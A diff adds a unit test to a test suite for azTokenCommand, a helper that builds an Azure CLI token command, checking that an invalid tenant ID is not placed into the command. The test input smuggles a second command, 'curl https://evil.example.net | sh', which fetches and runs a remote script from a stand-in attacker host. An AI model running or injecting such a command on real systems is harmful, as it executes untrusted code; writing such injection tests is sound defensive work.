@@ -79,6 +79,12 @@ describe('azTokenCommand', () => {
     )
     expect(azTokenCommand('arm')).toContain('--tenant <TENANT_ID>')
   })
+
+  it('never puts an invalid tenant ID into the command', () => {
+    const command = azTokenCommand('arm', 'x; curl https://evil.example.net | sh')
+    expect(command).toContain('--tenant <TENANT_ID> --query')
+    expect(command).not.toContain('curl')
+  })
 })
 
 describe('isBlockingWarning', () => {
